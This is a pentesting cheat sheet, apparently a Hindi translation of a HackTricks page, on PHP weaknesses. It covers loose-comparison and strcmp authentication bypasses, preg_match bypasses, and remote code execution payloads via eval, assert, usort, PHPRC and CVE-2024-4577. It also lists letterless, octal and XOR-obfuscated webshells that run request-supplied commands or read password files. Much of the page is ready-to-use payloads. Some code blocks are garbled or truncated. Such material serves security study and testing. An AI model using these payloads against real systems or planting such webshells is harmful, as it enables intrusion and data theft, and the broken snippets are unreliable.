# PHP Tricks

{{#include ../../../banners/hacktricks-training.md}}


## Cookies सामान्य स्थान:

यह phpMyAdmin कुकीज़ के लिए भी मान्य है।

Cookies:
```
PHPSESSID
phpMyAdmin
```
स्थान:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## PHP तुलना को बायपास करना

### ढीली तुलना/टाइप जुगलिंग ( == )

यदि PHP में `==` का उपयोग किया जाता है, तो कुछ अप्रत्याशित मामलों में तुलना अपेक्षित रूप से व्यवहार नहीं करती है। इसका कारण यह है कि "==" केवल उन मूल्यों की तुलना करता है जो समान प्रकार में परिवर्तित होते हैं, यदि आप यह भी तुलना करना चाहते हैं कि तुलना किए गए डेटा का प्रकार समान है, तो आपको `===` का उपयोग करना होगा।

PHP तुलना तालिकाएँ: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../images/image (567).png>)

{% file src="../../../images/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

- `"string" == 0 -> True` एक स्ट्रिंग जो संख्या से शुरू नहीं होती है, वह एक संख्या के बराबर होती है
- `"0xAAAA" == "43690" -> True` दशम या हेक्स प्रारूप में संख्याओं से बनी स्ट्रिंग्स अन्य संख्याओं/स्ट्रिंग्स के साथ तुलना की जा सकती हैं, यदि संख्याएँ समान थीं (स्ट्रिंग में संख्याएँ संख्याओं के रूप में व्याख्यायित की जाती हैं)
- `"0e3264578" == 0 --> True` "0e" से शुरू होने वाली और किसी भी चीज़ के बाद आने वाली स्ट्रिंग 0 के बराबर होगी
- `"0X3264578" == 0X --> True` "0" से शुरू होने वाली और किसी भी अक्षर (X कोई भी अक्षर हो सकता है) और किसी भी चीज़ के बाद आने वाली स्ट्रिंग 0 के बराबर होगी
- `"0e12334" == "0" --> True` यह बहुत दिलचस्प है क्योंकि कुछ मामलों में आप "0" के स्ट्रिंग इनपुट और कुछ सामग्री को नियंत्रित कर सकते हैं जो हैश की जा रही है और इसकी तुलना की जा रही है। इसलिए, यदि आप एक ऐसा मान प्रदान कर सकते हैं जो "0e" से शुरू होने वाला हैश बनाए और बिना किसी अक्षर के हो, तो आप तुलना को बायपास कर सकते हैं। आप इस प्रारूप में **पहले से हैश की गई स्ट्रिंग्स** यहाँ पा सकते हैं: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
- `"X" == 0 --> True` स्ट्रिंग में कोई भी अक्षर int 0 के बराबर होता है

अधिक जानकारी के लिए [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09) में देखें

### **in_array()**

**टाइप जुगलिंग** डिफ़ॉल्ट रूप से `in_array()` फ़ंक्शन को भी प्रभावित करता है (आपको सख्त तुलना करने के लिए तीसरे तर्क को सत्य पर सेट करना होगा):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

यदि इस फ़ंक्शन का उपयोग **किसी भी प्रमाणीकरण जांच** के लिए किया जाता है (जैसे पासवर्ड की जांच करना) और उपयोगकर्ता तुलना के एक पक्ष को नियंत्रित करता है, तो वह पासवर्ड के मान के रूप में एक स्ट्रिंग के बजाय एक खाली एरे भेज सकता है (`https://example.com/login.php/?username=admin&password[]=`) और इस जांच को बायपास कर सकता है:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
`strcasecmp()` के साथ भी वही त्रुटि होती है

### सख्त प्रकार की जुगलबंदी

यहां तक कि अगर `===` का **उपयोग किया जा रहा है** तो भी ऐसी त्रुटियाँ हो सकती हैं जो **तुलना को प्रकार की जुगलबंदी के प्रति संवेदनशील** बनाती हैं। उदाहरण के लिए, यदि तुलना **तुलना करने से पहले डेटा को एक अलग प्रकार के ऑब्जेक्ट में परिवर्तित कर रही है**:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg_match(/^.\*/)

**`preg_match()`** का उपयोग **उपयोगकर्ता इनपुट** को **मान्य** करने के लिए किया जा सकता है (यह **जांचता** है कि क्या कोई **शब्द/regex** **ब्लैकलिस्ट** में **उपस्थित** है और यदि नहीं है, तो कोड अपनी कार्यवाही जारी रख सकता है)।

#### नई पंक्ति बायपास

हालांकि, जब regexp`preg_match()` के प्रारंभ को सीमित किया जाता है, तो यह **केवल उपयोगकर्ता इनपुट की पहली पंक्ति** की **जांच** करता है, फिर यदि किसी तरह आप **कई पंक्तियों** में इनपुट **भेज** सकते हैं, तो आप इस जांच को बायपास करने में सक्षम हो सकते हैं। उदाहरण:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
इस जांच को बायपास करने के लिए आप **नए लाइनों के साथ urlencoded मान भेज सकते हैं** (`%0A`) या यदि आप **JSON डेटा** भेज सकते हैं, तो इसे **कई लाइनों में** भेजें:
```php
{
"cmd": "cat /etc/passwd"
}
```
यहाँ एक उदाहरण खोजें: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Length error bypass**

(यह बायपास स्पष्ट रूप से PHP 5.2.5 पर आजमाया गया था और मैं इसे PHP 7.3.15 पर काम नहीं करवा सका)\
यदि आप `preg_match()` को एक मान्य बहुत **बड़ा इनपुट** भेज सकते हैं, तो यह **इसे प्रोसेस नहीं कर पाएगा** और आप **चेक को बायपास** कर सकेंगे। उदाहरण के लिए, यदि यह एक JSON को ब्लैकलिस्ट कर रहा है, तो आप भेज सकते हैं:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
From: [https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0](https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0)

#### ReDoS Bypass

Trick from: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223) and [https://mizu.re/post/pong](https://mizu.re/post/pong)

<figure><img src="../../../images/image (26).png" alt=""><figcaption></figcaption></figure>

संक्षेप में, समस्या इस कारण होती है क्योंकि PHP में `preg_*` फ़ंक्शन [PCRE लाइब्रेरी](http://www.pcre.org/) पर आधारित होते हैं। PCRE में कुछ नियमित अभिव्यक्तियों को बहुत सारे पुनरावृत्त कॉल का उपयोग करके मिलाया जाता है, जो बहुत अधिक स्टैक स्पेस का उपयोग करता है। पुनरावृत्तियों की अनुमति की गई मात्रा पर एक सीमा निर्धारित करना संभव है, लेकिन PHP में यह सीमा [डिफ़ॉल्ट रूप से 100.000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) होती है, जो स्टैक में फिट होने से अधिक है।

[यह Stackoverflow थ्रेड](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) भी उस पोस्ट में लिंक किया गया था जहाँ इस मुद्दे के बारे में अधिक गहराई से चर्चा की गई है। हमारा कार्य अब स्पष्ट था:\
**एक इनपुट भेजें जो regex को 100_000+ पुनरावृत्तियों करने के लिए मजबूर करे, जिससे SIGSEGV हो, जिससे `preg_match()` फ़ंक्शन `false` लौटाए और इस प्रकार एप्लिकेशन को यह सोचने पर मजबूर करे कि हमारा इनपुट दुर्भावनापूर्ण नहीं है, अंत में पे लोड में कुछ ऐसा फेंकते हुए `{system(<verybadcommand>)}` जिससे SSTI --> RCE --> ध्वज :)**।

खैर, regex के संदर्भ में, हम वास्तव में 100k "पुनरावृत्तियों" नहीं कर रहे हैं, बल्कि हम "बैकट्रैकिंग स्टेप्स" की गिनती कर रहे हैं, जो [PHP दस्तावेज़](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) के अनुसार `pcre.backtrack_limit` चर में डिफ़ॉल्ट रूप से 1_000_000 (1M) होती है।\
इस तक पहुँचने के लिए, `'X'*500_001` 1 मिलियन बैकट्रैकिंग स्टेप्स (500k आगे और 500k पीछे) का परिणाम देगा:
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### PHP ओब्फ़स्केशन के लिए टाइप जुगलिंग
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Execute After Redirect (EAR)

यदि PHP किसी अन्य पृष्ठ पर रीडायरेक्ट कर रहा है लेकिन **`die`** या **`exit`** फ़ंक्शन **हेडर `Location`** सेट करने के बाद **कॉल** नहीं किया गया है, तो PHP निष्पादन जारी रखता है और डेटा को बॉडी में जोड़ता है:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Path Traversal and File Inclusion Exploitation

Check:

{{#ref}}
../../../pentesting-web/file-inclusion/
{{#endref}}

## More tricks

- **register_globals**: In **PHP < 4.1.1.1** या यदि गलत कॉन्फ़िगर किया गया हो, तो **register_globals** सक्रिय हो सकता है (या उनका व्यवहार अनुकरण किया जा रहा है)। इसका मतलब है कि वैश्विक चर जैसे $\_GET यदि उनके पास एक मान है जैसे $\_GET\["param"]="1234", तो आप इसे **$param के माध्यम से एक्सेस कर सकते हैं। इसलिए, HTTP पैरामीटर भेजकर आप उन चर को ओवरराइट कर सकते हैं\*\* जो कोड के भीतर उपयोग किए जाते हैं।
- **एक ही डोमेन के PHPSESSION कुकीज़ एक ही स्थान पर संग्रहीत होते हैं**, इसलिए यदि एक डोमेन में **विभिन्न कुकीज़ विभिन्न पथों में उपयोग की जाती हैं** तो आप उस पथ को बना सकते हैं **जो कुकी को पथ** सेटिंग के अन्य पथ कुकी के मान को एक्सेस करता है।\
इस तरह यदि **दोनों पथ एक ही नाम के साथ एक चर को एक्सेस करते हैं** तो आप **path1 में उस चर का मान path2 पर लागू कर सकते हैं**। और फिर path2 path1 के चर को मान्य के रूप में लेगा (कुकी को उस नाम के साथ देने से जो path2 में इसके लिए संबंधित है)।
- जब आपके पास मशीन के उपयोगकर्ताओं के **यूजरनेम** होते हैं। पता जांचें: **/\~\<USERNAME>** यह देखने के लिए कि क्या php निर्देशिकाएँ सक्रिय हैं।
- [**LFI और RCE का उपयोग करके php wrappers**](../../../pentesting-web/file-inclusion/)

### password_hash/password_verify

ये फ़ंक्शन आमतौर पर PHP में **पासवर्ड से हैश उत्पन्न करने** और यह **जांचने** के लिए उपयोग किए जाते हैं कि क्या एक पासवर्ड हैश के साथ सही है।\
समर्थित एल्गोरिदम हैं: `PASSWORD_DEFAULT` और `PASSWORD_BCRYPT` (जो `$2y$` से शुरू होता है)। ध्यान दें कि **PASSWORD_DEFAULT अक्सर PASSWORD_BCRYPT के समान होता है।** और वर्तमान में, **PASSWORD_BCRYPT** का **इनपुट में 72बाइट्स का आकार सीमा** है। इसलिए, जब आप इस एल्गोरिदम के साथ 72बाइट्स से बड़ा कुछ हैश करने की कोशिश करते हैं, तो केवल पहले 72B का उपयोग किया जाएगा:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTP headers bypass abusing PHP errors

#### Causing error after setting headers

From [**this twitter thread**](https://twitter.com/pilvar222/status/1784618120902005070?t=xYn7KdyIvnNOlkVaGbgL6A&s=19) आप देख सकते हैं कि 1000 से अधिक GET params या 1000 POST params या 20 फ़ाइलें भेजने पर, PHOP प्रतिक्रिया में हेडर सेट नहीं करेगा।

उदाहरण के लिए CSP हेडर को बायपास करने की अनुमति देता है जो कोड में सेट किए गए हैं:
```php
<?php
header("Content-Security-Policy: default-src 'none';");
if (isset($_GET["xss"])) echo $_GET["xss"];
```
#### हेडर सेट करने से पहले एक बॉडी भरना

यदि एक **PHP पृष्ठ त्रुटियों को प्रिंट कर रहा है और उपयोगकर्ता द्वारा प्रदान की गई कुछ इनपुट को वापस इको कर रहा है**, तो उपयोगकर्ता PHP सर्वर को कुछ **इतना लंबा सामग्री प्रिंट करने के लिए मजबूर कर सकता है** कि जब यह **उत्तर में हेडर जोड़ने की कोशिश करता है**, तो सर्वर एक त्रुटि फेंक देगा।\
निम्नलिखित परिदृश्य में **हमलावर ने सर्वर को कुछ बड़े त्रुटियाँ फेंकने के लिए मजबूर किया**, और जैसा कि आप स्क्रीन में देख सकते हैं जब PHP ने **हेडर जानकारी को संशोधित करने की कोशिश की, तो यह नहीं कर सका** (तो उदाहरण के लिए CSP हेडर उपयोगकर्ता को नहीं भेजा गया):

![](<../../../images/image (1085).png>)

## PHP फ़ंक्शंस में SSRF

पृष्ठ की जांच करें:

{{#ref}}
php-ssrf.md
{{#endref}}

## कोड निष्पादन

**system("ls");**\
&#xNAN;**\`ls\`;**\
**shell_exec("ls");**

[अधिक उपयोगी PHP फ़ंक्शंस के लिए इसे देखें](php-useful-functions-disable_functions-open_basedir-bypass/)

### **preg_replace() के माध्यम से** **RCE**
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
"replace" तर्क में कोड को निष्पादित करने के लिए कम से कम एक मेल की आवश्यकता है।\
preg_replace का यह विकल्प **PHP 5.5.0 से हटा दिया गया है।**

### **Eval() के माध्यम से RCE**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE via Assert()**

यह php के भीतर एक फ़ंक्शन है जो आपको **एक स्ट्रिंग में लिखे गए कोड को निष्पादित करने** की अनुमति देता है ताकि **सत्य या असत्य लौटाया जा सके** (और इसके आधार पर निष्पादन को बदल सके)। आमतौर पर उपयोगकर्ता चर को एक स्ट्रिंग के बीच में डाला जाएगा। उदाहरण के लिए:\
`assert("strpos($_GET['page']),'..') === false")` --> इस मामले में **RCE** प्राप्त करने के लिए आप कर सकते हैं:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
आपको **कोड** **सिंटैक्स** को **तोड़ना**, अपना **पेलोड** **जोड़ना**, और फिर **इसे फिर से ठीक करना** होगा। आप **लॉजिक ऑपरेशंस** जैसे "**and" या "%26%26" या "|"** का उपयोग कर सकते हैं। ध्यान दें कि "or", "||" काम नहीं करते क्योंकि यदि पहली शर्त सही है तो हमारा पेलोड निष्पादित नहीं होगा। इसी तरह ";" काम नहीं करता क्योंकि हमारा पेलोड निष्पादित नहीं होगा।

**दूसरा विकल्प** है कि स्ट्रिंग में कमांड का निष्पादन जोड़ें: `'.highlight_file('.passwd').'`

**दूसरा विकल्प** (यदि आपके पास आंतरिक कोड है) कुछ वेरिएबल को संशोधित करना है ताकि निष्पादन को बदल सकें: `$file = "hola"`

### **RCE via usort()**

यह फ़ंक्शन एक विशिष्ट फ़ंक्शन का उपयोग करके आइटम के एक एरे को क्रमबद्ध करने के लिए उपयोग किया जाता है।\
इस फ़ंक्शन का दुरुपयोग करने के लिए:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
आप **//** का उपयोग शेष कोड को टिप्पणी करने के लिए भी कर सकते हैं।

आपको बंद करने के लिए आवश्यक कोष्ठकों की संख्या खोजने के लिए:

- `?order=id;}//`: हमें एक त्रुटि संदेश मिलता है (`Parse error: syntax error, unexpected ';'`). शायद हम एक या अधिक कोष्ठक खो रहे हैं।
- `?order=id);}//`: हमें एक **चेतावनी** मिलती है। यह सही लगता है।
- `?order=id));}//`: हमें एक त्रुटि संदेश मिलता है (`Parse error: syntax error, unexpected ')' i`). शायद हमारे पास बहुत अधिक बंद कोष्ठक हैं।

### **RCE via .httaccess**

यदि आप **.htaccess** अपलोड कर सकते हैं, तो आप कई चीजें **कॉन्फ़िगर** कर सकते हैं और यहां तक कि कोड भी निष्पादित कर सकते हैं (यह कॉन्फ़िगर करते समय कि .htaccess एक्सटेंशन वाली फ़ाइलें **निष्पादित** की जा सकती हैं)।

विभिन्न .htaccess शेल [यहां](https://github.com/wireghoul/htshells) मिल सकते हैं।

### RCE via Env Variables

यदि आप एक भेद्यता पाते हैं जो आपको **PHP में env वेरिएबल्स को संशोधित** करने की अनुमति देती है (और एक और फ़ाइल अपलोड करने की अनुमति देती है, हालांकि अधिक शोध के साथ शायद इसे बायपास किया जा सकता है), तो आप इस व्यवहार का दुरुपयोग करके **RCE** प्राप्त कर सकते हैं।

- [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/index.html#ld_preload-and-ld_library_path): यह env वेरिएबल आपको अन्य बाइनरीज़ को निष्पादित करते समय मनमाने लाइब्रेरीज़ लोड करने की अनुमति देता है (हालांकि इस मामले में यह काम नहीं कर सकता)।
- **`PHPRC`** : PHP को **इसके कॉन्फ़िगरेशन फ़ाइल का स्थान** बताता है, जिसे आमतौर पर `php.ini` कहा जाता है। यदि आप अपनी स्वयं की कॉन्फ़िगरेशन फ़ाइल अपलोड कर सकते हैं, तो `PHPRC` का उपयोग करके PHP को उस पर इंगित करें। एक **`auto_prepend_file`** प्रविष्टि जोड़ें जो एक दूसरे अपलोड किए गए फ़ाइल को निर्दिष्ट करती है। यह दूसरा फ़ाइल सामान्य **PHP कोड है, जिसे फिर PHP रनटाइम द्वारा किसी अन्य कोड से पहले निष्पादित किया जाता है**।
1. हमारे शेलकोड वाला एक PHP फ़ाइल अपलोड करें
2. एक दूसरा फ़ाइल अपलोड करें, जिसमें एक **`auto_prepend_file`** निर्देश हो जो PHP प्रीप्रोसेसर को बताता है कि चरण 1 में अपलोड की गई फ़ाइल को निष्पादित करें
3. `PHPRC` वेरिएबल को चरण 2 में अपलोड की गई फ़ाइल पर सेट करें।
- इस श्रृंखला को निष्पादित करने के बारे में अधिक जानकारी प्राप्त करें [**मूल रिपोर्ट से**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/)।
- **PHPRC** - एक और विकल्प
- यदि आप **फ़ाइलें अपलोड नहीं कर सकते**, तो आप FreeBSD में "फ़ाइल" `/dev/fd/0` का उपयोग कर सकते हैं जिसमें **`stdin`** होता है, जो `stdin` पर भेजे गए अनुरोध का **शरीर** है:
- `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
- या RCE प्राप्त करने के लिए, **`allow_url_include`** सक्षम करें और **base64 PHP कोड** के साथ एक फ़ाइल को प्रीपेंड करें:
- `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
- तकनीक [**इस रिपोर्ट से**](https://vulncheck.com/blog/juniper-cve-2023-36845)।

### XAMPP CGI RCE - CVE-2024-4577

वेब सर्वर HTTP अनुरोधों को पार्स करता है और उन्हें एक PHP स्क्रिप्ट को पास करता है जो एक अनुरोध को निष्पादित करता है जैसे [`http://host/cgi.php?foo=bar`](http://host/cgi.php?foo=bar&ref=labs.watchtowr.com) को `php.exe cgi.php foo=bar` के रूप में, जो एक पैरामीटर इंजेक्शन की अनुमति देता है। यह निम्नलिखित पैरामीटर को इंजेक्ट करने की अनुमति देगा ताकि PHP कोड को शरीर से लोड किया जा सके:
```jsx
-d allow_url_include=1 -d auto_prepend_file=php://input
```
इसके अलावा, PHP के बाद के सामान्यीकरण के कारण "-" पैरामीटर को 0xAD वर्ण का उपयोग करके इंजेक्ट करना संभव है। [**इस पोस्ट**](https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/) से शोषण उदाहरण की जांच करें।
```jsx
POST /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{host}}
User-Agent: curl/8.3.0
Accept: */*
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php
phpinfo();
?>

```
## PHP Sanitization bypass & Brain Fuck

[**इस पोस्ट में**](https://blog.redteam-pentesting.de/2024/moodle-rce/) बहुत कम अक्षरों के साथ एक ब्रेन फक PHP कोड बनाने के लिए शानदार विचार मिल सकते हैं।\
इसके अलावा, यह कई जांचों को बायपास करने की अनुमति देने वाले कार्यों को निष्पादित करने का एक दिलचस्प तरीका भी प्रस्तावित किया गया है:
```php
(1)->{system($_GET[chr(97)])}
```
## PHP स्थैतिक विश्लेषण

देखें कि क्या आप इन फ़ंक्शनों (से [यहाँ](https://www.youtube.com/watch?v=SyWUsN0yHKI&feature=youtu.be)) में कॉल में कोड डाल सकते हैं:
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
यदि आप एक PHP एप्लिकेशन को डिबग कर रहे हैं, तो आप `display_errors = On` जोड़कर `/etc/php5/apache2/php.ini` में वैश्विक रूप से त्रुटि प्रिंटिंग सक्षम कर सकते हैं और अपाचे को पुनः प्रारंभ कर सकते हैं: `sudo systemctl restart apache2`

### PHP कोड को डिओबफस्केट करना

आप **www.unphp.net** का उपयोग PHP कोड को डिओबफस्केट करने के लिए कर सकते हैं।

## PHP रैपर और प्रोटोकॉल

PHP रैपर और प्रोटोकॉल आपको एक सिस्टम में **लिखने और पढ़ने की सुरक्षा को बायपास** करने और इसे समझौता करने की अनुमति दे सकते हैं। [**अधिक जानकारी के लिए इस पृष्ठ की जांच करें**](../../../pentesting-web/file-inclusion/index.html#lfi-rfi-using-php-wrappers-and-protocols)।

## Xdebug बिना प्रमाणीकरण वाला RCE

यदि आप देखते हैं कि **Xdebug** `phpconfig()` आउटपुट में **सक्षम** है, तो आपको [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit) के माध्यम से RCE प्राप्त करने का प्रयास करना चाहिए।

## वेरिएबल वेरिएबल्स
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE abusing new $\_GET\["a"]\($\_GET\["b")

यदि किसी पृष्ठ में आप **किसी भी मनचाही कक्षा का एक नया ऑब्जेक्ट बना सकते हैं** तो आप RCE प्राप्त करने में सक्षम हो सकते हैं, जानने के लिए निम्नलिखित पृष्ठ देखें:

{{#ref}}
php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md
{{#endref}}

## Execute PHP without letters

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Using octal
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¢___ not needed then $_($__), show_source(.passwd)
```
### XOR आसान शेल कोड

[**इस लेख** ](https://mgp25.com/ctf/Web-challenge/) के अनुसार, इस तरीके से एक आसान शेलकोड उत्पन्न करना संभव है:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
तो, यदि आप **संख्याओं और अक्षरों के बिना मनमाना PHP निष्पादित कर सकते हैं** तो आप निम्नलिखित अनुरोध भेज सकते हैं जो उस पेलोड का दुरुपयोग करके मनमाना PHP निष्पादित करता है:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
एक अधिक गहन व्याख्या के लिए देखें [https://ctf-wiki.org/web/php/php/#preg_match](https://ctf-wiki.org/web/php/php/#preg_match)

### XOR Shellcode (eval के अंदर)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### पर्ल जैसा
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
{{#include ../../../banners/hacktricks-training.md}}
